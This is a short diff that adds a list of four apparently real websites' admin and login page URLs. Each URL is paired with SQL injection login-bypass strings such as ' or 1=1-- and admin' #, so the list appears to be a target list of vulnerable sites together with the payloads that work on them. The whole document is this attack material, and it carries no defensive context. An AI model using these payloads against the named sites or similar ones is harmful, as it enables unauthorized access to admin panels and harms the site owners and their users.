@@ -1,0 +1,4 @@
+https://resulthost.in/demo/online-certificate-verification/login.php|'or''='
+https://nidj.ac.in/studentcorner/adminlogin.php|'or' '='|9' OR '9=9 
+https://www.swapnilpatni.com/spcstore/admin-spcstore/login.php|' or 1 or '
+https://bestshinedemo.co.in/admin_pages/login.php|admin' #|' or 1=1--|' or 1=1#
